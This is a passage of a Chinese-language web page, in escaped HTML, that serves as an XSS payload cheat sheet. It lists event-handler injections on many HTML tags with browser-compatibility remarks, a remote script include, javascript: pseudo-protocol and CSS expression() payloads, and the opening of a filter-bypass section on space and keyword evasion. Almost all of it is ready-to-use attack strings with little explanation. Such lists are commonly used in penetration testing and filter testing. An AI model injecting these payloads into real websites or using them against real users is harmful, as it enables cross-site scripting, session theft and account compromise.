class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onfocus&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(1)&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;autofocus&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;ifrme&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onload&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;quot;&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;&amp;quot;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;video&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;video&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;alert(1)&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;audio&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;audio&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;x&lt;/span&gt;  &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;quot;&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;&amp;quot;);&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Bash&#34;&gt;&lt;figure class=&#34;iseeu highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body/onload=alert(&lt;span class=&#34;string&#34;&gt;&amp;quot;xss&amp;quot;&lt;/span&gt;);&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;利用换行符以及 autofocus，自动去触发 onscroll 事件，无需用户去触发&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&lt;span class=&#34;attr&#34;&gt;onscroll&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;quot;&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;&amp;quot;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;autofocus&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;textarea&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;textarea&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onfocus&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;quot;&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;&amp;quot;); &lt;span class=&#34;attr&#34;&gt;autofocus&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;keygen&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;keygen&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;autofocus&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onfocus&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(1)&lt;/span&gt;&amp;gt;&lt;/span&gt; //仅限火狐&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;marquee&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;marquee&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onstart&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;quot;&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;&amp;quot;)&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;marquee&lt;/span&gt;&amp;gt;&lt;/span&gt; //Chrome不行，火狐和IE都可以&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;isindex&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;isindex&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;image&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;quot;&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;&amp;quot;)&amp;gt;&lt;/span&gt;//仅限于IE&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;利用 link 远程包含 js 文件&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PS：在无 CSP 的情况下才可以&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;rel&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/1.js&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;javascript伪协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#javascript伪协议&#34;&gt;#&lt;/a&gt; javascript 伪协议&lt;/h3&gt;
&lt;p&gt;&lt;a&gt;标签&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;javascript:alert(`xss`);&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;xss&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;  标签&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;javascript:alert(&lt;/span&gt;&amp;#x27;&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;&amp;#x27;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;  标签&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Csharp&#34;&gt;&lt;figure class=&#34;iseeu highlight csharp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=javascript:alert(&lt;span class=&#34;string&#34;&gt;&amp;#x27;xss&amp;#x27;&lt;/span&gt;)&amp;gt;&lt;span class=&#34;comment&#34;&gt;//IE7以下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;form&amp;gt;&lt;/code&gt;  标签&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Javascript:alert(1)&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;submit&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;其它&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其它&#34;&gt;#&lt;/a&gt; 其它&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;expression&lt;/code&gt;  属性&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Javascript&#34;&gt;&lt;figure class=&#34;iseeu highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img style=&lt;span class=&#34;string&#34;&gt;&amp;quot;xss:expression(alert(&amp;#x27;xss&amp;#x27;&amp;#x27;))&amp;quot;&lt;/span&gt;&amp;gt; &lt;span class=&#34;comment&#34;&gt;// IE7以下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;style&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;color:rgb(&amp;#x27;&amp;#x27;�x:expression(alert(1))&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//IE7以下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-css&#34;&gt;&lt;span class=&#34;selector-id&#34;&gt;#test&lt;/span&gt;&amp;#123;x:&lt;span class=&#34;built_in&#34;&gt;expression&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;alert&lt;/span&gt;(/XSS/))&amp;#125;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;// IE7以下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;background&lt;/code&gt;  属性&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;background&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;javascript:alert(1)&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;table&lt;/span&gt;&amp;gt;&lt;/span&gt; //在Opera 10.5和IE6上有效&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h2 id=&#34;绕过过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过过滤&#34;&gt;#&lt;/a&gt; 绕过过滤&lt;/h2&gt;
&lt;h3 id=&#34;1空格&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1空格&#34;&gt;#&lt;/a&gt; 1. 空格&lt;/h3&gt;
&lt;p&gt;用 &lt;code&gt;/&lt;/code&gt;  代替空格:  &lt;code&gt;&amp;lt;img/src=&amp;quot;x&amp;quot;/onerror=alert(&amp;quot;xss&amp;quot;);&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;2过滤关键词&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2过滤关键词&#34;&gt;#&lt;/a&gt; 2. 过滤关键词&lt;/h3&gt;
&lt;h4 id=&#34;大小写绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#大小写绕过&#34;&gt;#&lt;/a&gt; 大小写绕过&lt;/h4&gt;
